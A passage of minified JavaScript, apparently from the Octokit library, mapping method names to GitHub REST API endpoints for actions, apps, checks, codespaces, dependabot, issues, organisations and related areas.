/repos/{owner}/{repo}/actions/runners/downloads"],listSelectedReposForOrgSecret:["GET /orgs/{org}/actions/secrets/{secret_name}/repositories"],listSelectedReposForOrgVariable:["GET /orgs/{org}/actions/variables/{name}/repositories"],listSelectedRepositoriesEnabledGithubActionsOrganization:["GET /orgs/{org}/actions/permissions/repositories"],listSelfHostedRunnersForOrg:["GET /orgs/{org}/actions/runners"],listSelfHostedRunnersForRepo:["GET /repos/{owner}/{repo}/actions/runners"],listWorkflowRunArtifacts:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/artifacts"],listWorkflowRuns:["GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}/runs"],listWorkflowRunsForRepo:["GET /repos/{owner}/{repo}/actions/runs"],reRunJobForWorkflowRun:["POST /repos/{owner}/{repo}/actions/jobs/{job_id}/rerun"],reRunWorkflow:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/rerun"],reRunWorkflowFailedJobs:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/rerun-failed-jobs"],removeAllCustomLabelsFromSelfHostedRunnerForOrg:["DELETE /orgs/{org}/actions/runners/{runner_id}/labels"],removeAllCustomLabelsFromSelfHostedRunnerForRepo:["DELETE /repos/{owner}/{repo}/actions/runners/{runner_id}/labels"],removeCustomLabelFromSelfHostedRunnerForOrg:["DELETE /orgs/{org}/actions/runners/{runner_id}/labels/{name}"],removeCustomLabelFromSelfHostedRunnerForRepo:["DELETE /repos/{owner}/{repo}/actions/runners/{runner_id}/labels/{name}"],removeSelectedRepoFromOrgSecret:["DELETE /orgs/{org}/actions/secrets/{secret_name}/repositories/{repository_id}"],removeSelectedRepoFromOrgVariable:["DELETE /orgs/{org}/actions/variables/{name}/repositories/{repository_id}"],reviewCustomGatesForRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/deployment_protection_rule"],reviewPendingDeploymentsForRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/pending_deployments"],setAllowedActionsOrganization:["PUT /orgs/{org}/actions/permissions/selected-actions"],setAllowedActionsRepository:["PUT /repos/{owner}/{repo}/actions/permissions/selected-actions"],setCustomLabelsForSelfHostedRunnerForOrg:["PUT /orgs/{org}/actions/runners/{runner_id}/labels"],setCustomLabelsForSelfHostedRunnerForRepo:["PUT /repos/{owner}/{repo}/actions/runners/{runner_id}/labels"],setCustomOidcSubClaimForRepo:["PUT /repos/{owner}/{repo}/actions/oidc/customization/sub"],setGithubActionsDefaultWorkflowPermissionsOrganization:["PUT /orgs/{org}/actions/permissions/workflow"],setGithubActionsDefaultWorkflowPermissionsRepository:["PUT /repos/{owner}/{repo}/actions/permissions/workflow"],setGithubActionsPermissionsOrganization:["PUT /orgs/{org}/actions/permissions"],setGithubActionsPermissionsRepository:["PUT /repos/{owner}/{repo}/actions/permissions"],setSelectedReposForOrgSecret:["PUT /orgs/{org}/actions/secrets/{secret_name}/repositories"],setSelectedReposForOrgVariable:["PUT /orgs/{org}/actions/variables/{name}/repositories"],setSelectedRepositoriesEnabledGithubActionsOrganization:["PUT /orgs/{org}/actions/permissions/repositories"],setWorkflowAccessToRepository:["PUT /repos/{owner}/{repo}/actions/permissions/access"],updateEnvironmentVariable:["PATCH /repos/{owner}/{repo}/environments/{environment_name}/variables/{name}"],updateHostedRunnerForOrg:["PATCH /orgs/{org}/actions/hosted-runners/{hosted_runner_id}"],updateOrgVariable:["PATCH /orgs/{org}/actions/variables/{name}"],updateRepoVariable:["PATCH /repos/{owner}/{repo}/actions/variables/{name}"]},activity:{checkRepoIsStarredByAuthenticatedUser:["GET /user/starred/{owner}/{repo}"],deleteRepoSubscription:["DELETE /repos/{owner}/{repo}/subscription"],deleteThreadSubscription:["DELETE /notifications/threads/{thread_id}/subscription"],getFeeds:["GET /feeds"],getRepoSubscription:["GET /repos/{owner}/{repo}/subscription"],getThread:["GET /notifications/threads/{thread_id}"],getThreadSubscriptionForAuthenticatedUser:["GET /notifications/threads/{thread_id}/subscription"],listEventsForAuthenticatedUser:["GET /users/{username}/events"],listNotificationsForAuthenticatedUser:["GET /notifications"],listOrgEventsForAuthenticatedUser:["GET /users/{username}/events/orgs/{org}"],listPublicEvents:["GET /events"],listPublicEventsForRepoNetwork:["GET /networks/{owner}/{repo}/events"],listPublicEventsForUser:["GET /users/{username}/events/public"],listPublicOrgEvents:["GET /orgs/{org}/events"],listReceivedEventsForUser:["GET /users/{username}/received_events"],listReceivedPublicEventsForUser:["GET /users/{username}/received_events/public"],listRepoEvents:["GET /repos/{owner}/{repo}/events"],listRepoNotificationsForAuthenticatedUser:["GET /repos/{owner}/{repo}/notifications"],listReposStarredByAuthenticatedUser:["GET /user/starred"],listReposStarredByUser:["GET /users/{username}/starred"],listReposWatchedByUser:["GET /users/{username}/subscriptions"],listStargazersForRepo:["GET /repos/{owner}/{repo}/stargazers"],listWatchedReposForAuthenticatedUser:["GET /user/subscriptions"],listWatchersForRepo:["GET /repos/{owner}/{repo}/subscribers"],markNotificationsAsRead:["PUT /notifications"],markRepoNotificationsAsRead:["PUT /repos/{owner}/{repo}/notifications"],markThreadAsDone:["DELETE /notifications/threads/{thread_id}"],markThreadAsRead:["PATCH /notifications/threads/{thread_id}"],setRepoSubscription:["PUT /repos/{owner}/{repo}/subscription"],setThreadSubscription:["PUT /notifications/threads/{thread_id}/subscription"],starRepoForAuthenticatedUser:["PUT /user/starred/{owner}/{repo}"],unstarRepoForAuthenticatedUser:["DELETE /user/starred/{owner}/{repo}"]},apps:{addRepoToInstallation:["PUT /user/installations/{installation_id}/repositories/{repository_id}",{},{renamed:["apps","addRepoToInstallationForAuthenticatedUser"]}],addRepoToInstallationForAuthenticatedUser:["PUT /user/installations/{installation_id}/repositories/{repository_id}"],checkToken:["POST /applications/{client_id}/token"],createFromManifest:["POST /app-manifests/{code}/conversions"],createInstallationAccessToken:["POST /app/installations/{installation_id}/access_tokens"],deleteAuthorization:["DELETE /applications/{client_id}/grant"],deleteInstallation:["DELETE /app/installations/{installation_id}"],deleteToken:["DELETE /applications/{client_id}/token"],getAuthenticated:["GET /app"],getBySlug:["GET /apps/{app_slug}"],getInstallation:["GET /app/installations/{installation_id}"],getOrgInstallation:["GET /orgs/{org}/installation"],getRepoInstallation:["GET /repos/{owner}/{repo}/installation"],getSubscriptionPlanForAccount:["GET /marketplace_listing/accounts/{account_id}"],getSubscriptionPlanForAccountStubbed:["GET /marketplace_listing/stubbed/accounts/{account_id}"],getUserInstallation:["GET /users/{username}/installation"],getWebhookConfigForApp:["GET /app/hook/config"],getWebhookDelivery:["GET /app/hook/deliveries/{delivery_id}"],listAccountsForPlan:["GET /marketplace_listing/plans/{plan_id}/accounts"],listAccountsForPlanStubbed:["GET /marketplace_listing/stubbed/plans/{plan_id}/accounts"],listInstallationReposForAuthenticatedUser:["GET /user/installations/{installation_id}/repositories"],listInstallationRequestsForAuthenticatedApp:["GET /app/installation-requests"],listInstallations:["GET /app/installations"],listInstallationsForAuthenticatedUser:["GET /user/installations"],listPlans:["GET /marketplace_listing/plans"],listPlansStubbed:["GET /marketplace_listing/stubbed/plans"],listReposAccessibleToInstallation:["GET /installation/repositories"],listSubscriptionsForAuthenticatedUser:["GET /user/marketplace_purchases"],listSubscriptionsForAuthenticatedUserStubbed:["GET /user/marketplace_purchases/stubbed"],listWebhookDeliveries:["GET /app/hook/deliveries"],redeliverWebhookDelivery:["POST /app/hook/deliveries/{delivery_id}/attempts"],removeRepoFromInstallation:["DELETE /user/installations/{installation_id}/repositories/{repository_id}",{},{renamed:["apps","removeRepoFromInstallationForAuthenticatedUser"]}],removeRepoFromInstallationForAuthenticatedUser:["DELETE /user/installations/{installation_id}/repositories/{repository_id}"],resetToken:["PATCH /applications/{client_id}/token"],revokeInstallationAccessToken:["DELETE /installation/token"],scopeToken:["POST /applications/{client_id}/token/scoped"],suspendInstallation:["PUT /app/installations/{installation_id}/suspended"],unsuspendInstallation:["DELETE /app/installations/{installation_id}/suspended"],updateWebhookConfigForApp:["PATCH /app/hook/config"]},billing:{getGithubActionsBillingOrg:["GET /orgs/{org}/settings/billing/actions"],getGithubActionsBillingUser:["GET /users/{username}/settings/billing/actions"],getGithubBillingUsageReportOrg:["GET /organizations/{org}/settings/billing/usage"],getGithubPackagesBillingOrg:["GET /orgs/{org}/settings/billing/packages"],getGithubPackagesBillingUser:["GET /users/{username}/settings/billing/packages"],getSharedStorageBillingOrg:["GET /orgs/{org}/settings/billing/shared-storage"],getSharedStorageBillingUser:["GET /users/{username}/settings/billing/shared-storage"]},checks:{create:["POST /repos/{owner}/{repo}/check-runs"],createSuite:["POST /repos/{owner}/{repo}/check-suites"],get:["GET /repos/{owner}/{repo}/check-runs/{check_run_id}"],getSuite:["GET /repos/{owner}/{repo}/check-suites/{check_suite_id}"],listAnnotations:["GET /repos/{owner}/{repo}/check-runs/{check_run_id}/annotations"],listForRef:["GET /repos/{owner}/{repo}/commits/{ref}/check-runs"],listForSuite:["GET /repos/{owner}/{repo}/check-suites/{check_suite_id}/check-runs"],listSuitesForRef:["GET /repos/{owner}/{repo}/commits/{ref}/check-suites"],rerequestRun:["POST /repos/{owner}/{repo}/check-runs/{check_run_id}/rerequest"],rerequestSuite:["POST /repos/{owner}/{repo}/check-suites/{check_suite_id}/rerequest"],setSuitesPreferences:["PATCH /repos/{owner}/{repo}/check-suites/preferences"],update:["PATCH /repos/{owner}/{repo}/check-runs/{check_run_id}"]},codeScanning:{commitAutofix:["POST /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/autofix/commits"],createAutofix:["POST /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/autofix"],createVariantAnalysis:["POST /repos/{owner}/{repo}/code-scanning/codeql/variant-analyses"],deleteAnalysis:["DELETE /repos/{owner}/{repo}/code-scanning/analyses/{analysis_id}{?confirm_delete}"],deleteCodeqlDatabase:["DELETE /repos/{owner}/{repo}/code-scanning/codeql/databases/{language}"],getAlert:["GET /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}",{},{renamedParameters:{alert_id:"alert_number"}}],getAnalysis:["GET /repos/{owner}/{repo}/code-scanning/analyses/{analysis_id}"],getAutofix:["GET /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/autofix"],getCodeqlDatabase:["GET /repos/{owner}/{repo}/code-scanning/codeql/databases/{language}"],getDefaultSetup:["GET /repos/{owner}/{repo}/code-scanning/default-setup"],getSarif:["GET /repos/{owner}/{repo}/code-scanning/sarifs/{sarif_id}"],getVariantAnalysis:["GET /repos/{owner}/{repo}/code-scanning/codeql/variant-analyses/{codeql_variant_analysis_id}"],getVariantAnalysisRepoTask:["GET /repos/{owner}/{repo}/code-scanning/codeql/variant-analyses/{codeql_variant_analysis_id}/repos/{repo_owner}/{repo_name}"],listAlertInstances:["GET /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/instances"],listAlertsForOrg:["GET /orgs/{org}/code-scanning/alerts"],listAlertsForRepo:["GET /repos/{owner}/{repo}/code-scanning/alerts"],listAlertsInstances:["GET /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}/instances",{},{renamed:["codeScanning","listAlertInstances"]}],listCodeqlDatabases:["GET /repos/{owner}/{repo}/code-scanning/codeql/databases"],listRecentAnalyses:["GET /repos/{owner}/{repo}/code-scanning/analyses"],updateAlert:["PATCH /repos/{owner}/{repo}/code-scanning/alerts/{alert_number}"],updateDefaultSetup:["PATCH /repos/{owner}/{repo}/code-scanning/default-setup"],uploadSarif:["POST /repos/{owner}/{repo}/code-scanning/sarifs"]},codeSecurity:{attachConfiguration:["POST /orgs/{org}/code-security/configurations/{configuration_id}/attach"],attachEnterpriseConfiguration:["POST /enterprises/{enterprise}/code-security/configurations/{configuration_id}/attach"],createConfiguration:["POST /orgs/{org}/code-security/configurations"],createConfigurationForEnterprise:["POST /enterprises/{enterprise}/code-security/configurations"],deleteConfiguration:["DELETE /orgs/{org}/code-security/configurations/{configuration_id}"],deleteConfigurationForEnterprise:["DELETE /enterprises/{enterprise}/code-security/configurations/{configuration_id}"],detachConfiguration:["DELETE /orgs/{org}/code-security/configurations/detach"],getConfiguration:["GET /orgs/{org}/code-security/configurations/{configuration_id}"],getConfigurationForRepository:["GET /repos/{owner}/{repo}/code-security-configuration"],getConfigurationsForEnterprise:["GET /enterprises/{enterprise}/code-security/configurations"],getConfigurationsForOrg:["GET /orgs/{org}/code-security/configurations"],getDefaultConfigurations:["GET /orgs/{org}/code-security/configurations/defaults"],getDefaultConfigurationsForEnterprise:["GET /enterprises/{enterprise}/code-security/configurations/defaults"],getRepositoriesForConfiguration:["GET /orgs/{org}/code-security/configurations/{configuration_id}/repositories"],getRepositoriesForEnterpriseConfiguration:["GET /enterprises/{enterprise}/code-security/configurations/{configuration_id}/repositories"],getSingleConfigurationForEnterprise:["GET /enterprises/{enterprise}/code-security/configurations/{configuration_id}"],setConfigurationAsDefault:["PUT /orgs/{org}/code-security/configurations/{configuration_id}/defaults"],setConfigurationAsDefaultForEnterprise:["PUT /enterprises/{enterprise}/code-security/configurations/{configuration_id}/defaults"],updateConfiguration:["PATCH /orgs/{org}/code-security/configurations/{configuration_id}"],updateEnterpriseConfiguration:["PATCH /enterprises/{enterprise}/code-security/configurations/{configuration_id}"]},codesOfConduct:{getAllCodesOfConduct:["GET /codes_of_conduct"],getConductCode:["GET /codes_of_conduct/{key}"]},codespaces:{addRepositoryForSecretForAuthenticatedUser:["PUT /user/codespaces/secrets/{secret_name}/repositories/{repository_id}"],addSelectedRepoToOrgSecret:["PUT /orgs/{org}/codespaces/secrets/{secret_name}/repositories/{repository_id}"],checkPermissionsForDevcontainer:["GET /repos/{owner}/{repo}/codespaces/permissions_check"],codespaceMachinesForAuthenticatedUser:["GET /user/codespaces/{codespace_name}/machines"],createForAuthenticatedUser:["POST /user/codespaces"],createOrUpdateOrgSecret:["PUT /orgs/{org}/codespaces/secrets/{secret_name}"],createOrUpdateRepoSecret:["PUT /repos/{owner}/{repo}/codespaces/secrets/{secret_name}"],createOrUpdateSecretForAuthenticatedUser:["PUT /user/codespaces/secrets/{secret_name}"],createWithPrForAuthenticatedUser:["POST /repos/{owner}/{repo}/pulls/{pull_number}/codespaces"],createWithRepoForAuthenticatedUser:["POST /repos/{owner}/{repo}/codespaces"],deleteForAuthenticatedUser:["DELETE /user/codespaces/{codespace_name}"],deleteFromOrganization:["DELETE /orgs/{org}/members/{username}/codespaces/{codespace_name}"],deleteOrgSecret:["DELETE /orgs/{org}/codespaces/secrets/{secret_name}"],deleteRepoSecret:["DELETE /repos/{owner}/{repo}/codespaces/secrets/{secret_name}"],deleteSecretForAuthenticatedUser:["DELETE /user/codespaces/secrets/{secret_name}"],exportForAuthenticatedUser:["POST /user/codespaces/{codespace_name}/exports"],getCodespacesForUserInOrg:["GET /orgs/{org}/members/{username}/codespaces"],getExportDetailsForAuthenticatedUser:["GET /user/codespaces/{codespace_name}/exports/{export_id}"],getForAuthenticatedUser:["GET /user/codespaces/{codespace_name}"],getOrgPublicKey:["GET /orgs/{org}/codespaces/secrets/public-key"],getOrgSecret:["GET /orgs/{org}/codespaces/secrets/{secret_name}"],getPublicKeyForAuthenticatedUser:["GET /user/codespaces/secrets/public-key"],getRepoPublicKey:["GET /repos/{owner}/{repo}/codespaces/secrets/public-key"],getRepoSecret:["GET /repos/{owner}/{repo}/codespaces/secrets/{secret_name}"],getSecretForAuthenticatedUser:["GET /user/codespaces/secrets/{secret_name}"],listDevcontainersInRepositoryForAuthenticatedUser:["GET /repos/{owner}/{repo}/codespaces/devcontainers"],listForAuthenticatedUser:["GET /user/codespaces"],listInOrganization:["GET /orgs/{org}/codespaces",{},{renamedParameters:{org_id:"org"}}],listInRepositoryForAuthenticatedUser:["GET /repos/{owner}/{repo}/codespaces"],listOrgSecrets:["GET /orgs/{org}/codespaces/secrets"],listRepoSecrets:["GET /repos/{owner}/{repo}/codespaces/secrets"],listRepositoriesForSecretForAuthenticatedUser:["GET /user/codespaces/secrets/{secret_name}/repositories"],listSecretsForAuthenticatedUser:["GET /user/codespaces/secrets"],listSelectedReposForOrgSecret:["GET /orgs/{org}/codespaces/secrets/{secret_name}/repositories"],preFlightWithRepoForAuthenticatedUser:["GET /repos/{owner}/{repo}/codespaces/new"],publishForAuthenticatedUser:["POST /user/codespaces/{codespace_name}/publish"],removeRepositoryForSecretForAuthenticatedUser:["DELETE /user/codespaces/secrets/{secret_name}/repositories/{repository_id}"],removeSelectedRepoFromOrgSecret:["DELETE /orgs/{org}/codespaces/secrets/{secret_name}/repositories/{repository_id}"],repoMachinesForAuthenticatedUser:["GET /repos/{owner}/{repo}/codespaces/machines"],setRepositoriesForSecretForAuthenticatedUser:["PUT /user/codespaces/secrets/{secret_name}/repositories"],setSelectedReposForOrgSecret:["PUT /orgs/{org}/codespaces/secrets/{secret_name}/repositories"],startForAuthenticatedUser:["POST /user/codespaces/{codespace_name}/start"],stopForAuthenticatedUser:["POST /user/codespaces/{codespace_name}/stop"],stopInOrganization:["POST /orgs/{org}/members/{username}/codespaces/{codespace_name}/stop"],updateForAuthenticatedUser:["PATCH /user/codespaces/{codespace_name}"]},copilot:{addCopilotSeatsForTeams:["POST /orgs/{org}/copilot/billing/selected_teams"],addCopilotSeatsForUsers:["POST /orgs/{org}/copilot/billing/selected_users"],cancelCopilotSeatAssignmentForTeams:["DELETE /orgs/{org}/copilot/billing/selected_teams"],cancelCopilotSeatAssignmentForUsers:["DELETE /orgs/{org}/copilot/billing/selected_users"],copilotMetricsForOrganization:["GET /orgs/{org}/copilot/metrics"],copilotMetricsForTeam:["GET /orgs/{org}/team/{team_slug}/copilot/metrics"],getCopilotOrganizationDetails:["GET /orgs/{org}/copilot/billing"],getCopilotSeatDetailsForUser:["GET /orgs/{org}/members/{username}/copilot"],listCopilotSeats:["GET /orgs/{org}/copilot/billing/seats"],usageMetricsForOrg:["GET /orgs/{org}/copilot/usage"],usageMetricsForTeam:["GET /orgs/{org}/team/{team_slug}/copilot/usage"]},dependabot:{addSelectedRepoToOrgSecret:["PUT /orgs/{org}/dependabot/secrets/{secret_name}/repositories/{repository_id}"],createOrUpdateOrgSecret:["PUT /orgs/{org}/dependabot/secrets/{secret_name}"],createOrUpdateRepoSecret:["PUT /repos/{owner}/{repo}/dependabot/secrets/{secret_name}"],deleteOrgSecret:["DELETE /orgs/{org}/dependabot/secrets/{secret_name}"],deleteRepoSecret:["DELETE /repos/{owner}/{repo}/dependabot/secrets/{secret_name}"],getAlert:["GET /repos/{owner}/{repo}/dependabot/alerts/{alert_number}"],getOrgPublicKey:["GET /orgs/{org}/dependabot/secrets/public-key"],getOrgSecret:["GET /orgs/{org}/dependabot/secrets/{secret_name}"],getRepoPublicKey:["GET /repos/{owner}/{repo}/dependabot/secrets/public-key"],getRepoSecret:["GET /repos/{owner}/{repo}/dependabot/secrets/{secret_name}"],listAlertsForEnterprise:["GET /enterprises/{enterprise}/dependabot/alerts"],listAlertsForOrg:["GET /orgs/{org}/dependabot/alerts"],listAlertsForRepo:["GET /repos/{owner}/{repo}/dependabot/alerts"],listOrgSecrets:["GET /orgs/{org}/dependabot/secrets"],listRepoSecrets:["GET /repos/{owner}/{repo}/dependabot/secrets"],listSelectedReposForOrgSecret:["GET /orgs/{org}/dependabot/secrets/{secret_name}/repositories"],removeSelectedRepoFromOrgSecret:["DELETE /orgs/{org}/dependabot/secrets/{secret_name}/repositories/{repository_id}"],setSelectedReposForOrgSecret:["PUT /orgs/{org}/dependabot/secrets/{secret_name}/repositories"],updateAlert:["PATCH /repos/{owner}/{repo}/dependabot/alerts/{alert_number}"]},dependencyGraph:{createRepositorySnapshot:["POST /repos/{owner}/{repo}/dependency-graph/snapshots"],diffRange:["GET /repos/{owner}/{repo}/dependency-graph/compare/{basehead}"],exportSbom:["GET /repos/{owner}/{repo}/dependency-graph/sbom"]},emojis:{get:["GET /emojis"]},gists:{checkIsStarred:["GET /gists/{gist_id}/star"],create:["POST /gists"],createComment:["POST /gists/{gist_id}/comments"],delete:["DELETE /gists/{gist_id}"],deleteComment:["DELETE /gists/{gist_id}/comments/{comment_id}"],fork:["POST /gists/{gist_id}/forks"],get:["GET /gists/{gist_id}"],getComment:["GET /gists/{gist_id}/comments/{comment_id}"],getRevision:["GET /gists/{gist_id}/{sha}"],list:["GET /gists"],listComments:["GET /gists/{gist_id}/comments"],listCommits:["GET /gists/{gist_id}/commits"],listForUser:["GET /users/{username}/gists"],listForks:["GET /gists/{gist_id}/forks"],listPublic:["GET /gists/public"],listStarred:["GET /gists/starred"],star:["PUT /gists/{gist_id}/star"],unstar:["DELETE /gists/{gist_id}/star"],update:["PATCH /gists/{gist_id}"],updateComment:["PATCH /gists/{gist_id}/comments/{comment_id}"]},git:{createBlob:["POST /repos/{owner}/{repo}/git/blobs"],createCommit:["POST /repos/{owner}/{repo}/git/commits"],createRef:["POST /repos/{owner}/{repo}/git/refs"],createTag:["POST /repos/{owner}/{repo}/git/tags"],createTree:["POST /repos/{owner}/{repo}/git/trees"],deleteRef:["DELETE /repos/{owner}/{repo}/git/refs/{ref}"],getBlob:["GET /repos/{owner}/{repo}/git/blobs/{file_sha}"],getCommit:["GET /repos/{owner}/{repo}/git/commits/{commit_sha}"],getRef:["GET /repos/{owner}/{repo}/git/ref/{ref}"],getTag:["GET /repos/{owner}/{repo}/git/tags/{tag_sha}"],getTree:["GET /repos/{owner}/{repo}/git/trees/{tree_sha}"],listMatchingRefs:["GET /repos/{owner}/{repo}/git/matching-refs/{ref}"],updateRef:["PATCH /repos/{owner}/{repo}/git/refs/{ref}"]},gitignore:{getAllTemplates:["GET /gitignore/templates"],getTemplate:["GET /gitignore/templates/{name}"]},hostedCompute:{createNetworkConfigurationForOrg:["POST /orgs/{org}/settings/network-configurations"],deleteNetworkConfigurationFromOrg:["DELETE /orgs/{org}/settings/network-configurations/{network_configuration_id}"],getNetworkConfigurationForOrg:["GET /orgs/{org}/settings/network-configurations/{network_configuration_id}"],getNetworkSettingsForOrg:["GET /orgs/{org}/settings/network-settings/{network_settings_id}"],listNetworkConfigurationsForOrg:["GET /orgs/{org}/settings/network-configurations"],updateNetworkConfigurationForOrg:["PATCH /orgs/{org}/settings/network-configurations/{network_configuration_id}"]},interactions:{getRestrictionsForAuthenticatedUser:["GET /user/interaction-limits"],getRestrictionsForOrg:["GET /orgs/{org}/interaction-limits"],getRestrictionsForRepo:["GET /repos/{owner}/{repo}/interaction-limits"],getRestrictionsForYourPublicRepos:["GET /user/interaction-limits",{},{renamed:["interactions","getRestrictionsForAuthenticatedUser"]}],removeRestrictionsForAuthenticatedUser:["DELETE /user/interaction-limits"],removeRestrictionsForOrg:["DELETE /orgs/{org}/interaction-limits"],removeRestrictionsForRepo:["DELETE /repos/{owner}/{repo}/interaction-limits"],removeRestrictionsForYourPublicRepos:["DELETE /user/interaction-limits",{},{renamed:["interactions","removeRestrictionsForAuthenticatedUser"]}],setRestrictionsForAuthenticatedUser:["PUT /user/interaction-limits"],setRestrictionsForOrg:["PUT /orgs/{org}/interaction-limits"],setRestrictionsForRepo:["PUT /repos/{owner}/{repo}/interaction-limits"],setRestrictionsForYourPublicRepos:["PUT /user/interaction-limits",{},{renamed:["interactions","setRestrictionsForAuthenticatedUser"]}]},issues:{addAssignees:["POST /repos/{owner}/{repo}/issues/{issue_number}/assignees"],addLabels:["POST /repos/{owner}/{repo}/issues/{issue_number}/labels"],addSubIssue:["POST /repos/{owner}/{repo}/issues/{issue_number}/sub_issues"],checkUserCanBeAssigned:["GET /repos/{owner}/{repo}/assignees/{assignee}"],checkUserCanBeAssignedToIssue:["GET /repos/{owner}/{repo}/issues/{issue_number}/assignees/{assignee}"],create:["POST /repos/{owner}/{repo}/issues"],createComment:["POST /repos/{owner}/{repo}/issues/{issue_number}/comments"],createLabel:["POST /repos/{owner}/{repo}/labels"],createMilestone:["POST /repos/{owner}/{repo}/milestones"],deleteComment:["DELETE /repos/{owner}/{repo}/issues/comments/{comment_id}"],deleteLabel:["DELETE /repos/{owner}/{repo}/labels/{name}"],deleteMilestone:["DELETE /repos/{owner}/{repo}/milestones/{milestone_number}"],get:["GET /repos/{owner}/{repo}/issues/{issue_number}"],getComment:["GET /repos/{owner}/{repo}/issues/comments/{comment_id}"],getEvent:["GET /repos/{owner}/{repo}/issues/events/{event_id}"],getLabel:["GET /repos/{owner}/{repo}/labels/{name}"],getMilestone:["GET /repos/{owner}/{repo}/milestones/{milestone_number}"],list:["GET /issues"],listAssignees:["GET /repos/{owner}/{repo}/assignees"],listComments:["GET /repos/{owner}/{repo}/issues/{issue_number}/comments"],listCommentsForRepo:["GET /repos/{owner}/{repo}/issues/comments"],listEvents:["GET /repos/{owner}/{repo}/issues/{issue_number}/events"],listEventsForRepo:["GET /repos/{owner}/{repo}/issues/events"],listEventsForTimeline:["GET /repos/{owner}/{repo}/issues/{issue_number}/timeline"],listForAuthenticatedUser:["GET /user/issues"],listForOrg:["GET /orgs/{org}/issues"],listForRepo:["GET /repos/{owner}/{repo}/issues"],listLabelsForMilestone:["GET /repos/{owner}/{repo}/milestones/{milestone_number}/labels"],listLabelsForRepo:["GET /repos/{owner}/{repo}/labels"],listLabelsOnIssue:["GET /repos/{owner}/{repo}/issues/{issue_number}/labels"],listMilestones:["GET /repos/{owner}/{repo}/milestones"],listSubIssues:["GET /repos/{owner}/{repo}/issues/{issue_number}/sub_issues"],lock:["PUT /repos/{owner}/{repo}/issues/{issue_number}/lock"],removeAllLabels:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/labels"],removeAssignees:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/assignees"],removeLabel:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/labels/{name}"],removeSubIssue:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/sub_issue"],reprioritizeSubIssue:["PATCH /repos/{owner}/{repo}/issues/{issue_number}/sub_issues/priority"],setLabels:["PUT /repos/{owner}/{repo}/issues/{issue_number}/labels"],unlock:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/lock"],update:["PATCH /repos/{owner}/{repo}/issues/{issue_number}"],updateComment:["PATCH /repos/{owner}/{repo}/issues/comments/{comment_id}"],updateLabel:["PATCH /repos/{owner}/{repo}/labels/{name}"],updateMilestone:["PATCH /repos/{owner}/{repo}/milestones/{milestone_number}"]},licenses:{get:["GET /licenses/{license}"],getAllCommonlyUsed:["GET /licenses"],getForRepo:["GET /repos/{owner}/{repo}/license"]},markdown:{render:["POST /markdown"],renderRaw:["POST /markdown/raw",{headers:{"content-type":"text/plain; charset=utf-8"}}]},meta:{get:["GET /meta"],getAllVersions:["GET /versions"],getOctocat:["GET /octocat"],getZen:["GET /zen"],root:["GET /"]},migrations:{deleteArchiveForAuthenticatedUser:["DELETE /user/migrations/{migration_id}/archive"],deleteArchiveForOrg:["DELETE /orgs/{org}/migrations/{migration_id}/archive"],downloadArchiveForOrg:["GET /orgs/{org}/migrations/{migration_id}/archive"],getArchiveForAuthenticatedUser:["GET /user/migrations/{migration_id}/archive"],getStatusForAuthenticatedUser:["GET /user/migrations/{migration_id}"],getStatusForOrg:["GET /orgs/{org}/migrations/{migration_id}"],listForAuthenticatedUser:["GET /user/migrations"],listForOrg:["GET /orgs/{org}/migrations"],listReposForAuthenticatedUser:["GET /user/migrations/{migration_id}/repositories"],listReposForOrg:["GET /orgs/{org}/migrations/{migration_id}/repositories"],listReposForUser:["GET /user/migrations/{migration_id}/repositories",{},{renamed:["migrations","listReposForAuthenticatedUser"]}],startForAuthenticatedUser:["POST /user/migrations"],startForOrg:["POST /orgs/{org}/migrations"],unlockRepoForAuthenticatedUser:["DELETE /user/migrations/{migration_id}/repos/{repo_name}/lock"],unlockRepoForOrg:["DELETE /orgs/{org}/migrations/{migration_id}/repos/{repo_name}/lock"]},oidc:{getOidcCustomSubTemplateForOrg:["GET /orgs/{org}/actions/oidc/customization/sub"],updateOidcCustomSubTemplateForOrg:["PUT /orgs/{org}/actions/oidc/customization/sub"]},orgs:{addSecurityManagerTeam:["PUT /orgs/{org}/security-managers/teams/{team_slug}",{},{deprecated:"octokit.rest.orgs.addSecurityManagerTeam() is deprecated, see https://docs.github.com/rest/orgs/security-managers#add-a-security-manager-team"}],assignTeamToOrgRole:["PUT /orgs/{org}/organization-roles/teams/{team_slug}/{role_id}"],assignUserToOrgRole:["PUT /orgs/{org}/organization-roles/users/{username}/{role_id}"],blockUser:["PUT /orgs/{org}/blocks/{username}"],cancelInvitation:["DELETE /orgs/{org}/invitations/{invitation_id}"],checkBlockedUser:["GET /orgs/{org}/blocks/{username}"],checkMembershipForUser:["GET /orgs/{org}/members/{username}"],checkPublicMembershipForUser:["GET /orgs/{org}/public_members/{username}"],convertMemberToOutsideCollaborator:["PUT /orgs/{org}/outside_collaborators/{username}"],createInvitation:["POST /orgs/{org}/invitations"],createIssueType:["POST /orgs/{org}/issue-types"],createOrUpdateCustomProperties:["PATCH /orgs/{org}/properties/schema"],createOrUpdateCustomPropertiesValuesForRepos:["PATCH /orgs/{org}/properties/values"],createOrUpdateCustomProperty:["PUT /orgs/{org}/properties/schema/{custom_property_name}"],createWebhook:["POST /orgs/{org}/hooks"],delete:["DELETE /orgs/{org}"],deleteIssueType:["DELETE /orgs/{org}/issue-types/{issue_type_id}"],deleteWebhook:["DELETE /orgs/{org}/hooks/{hook_id}"],enableOrDisableSecurityProductOnAllOrgRepos:["POST /orgs/{org}/{security_product}/{enablement}",{},{deprecated:"octokit.rest.orgs.enableOrDisableSecurityProductOnAllOrgRepos() is deprecated, see https://docs.github.com/rest/orgs/orgs#enable-or-disable-a-security-feature-for-an-organization"}],get:["GET /orgs/{org}"],getAllCustomProperties:["GET /orgs/{org}/properties/schema"],getCustomProperty:["GET 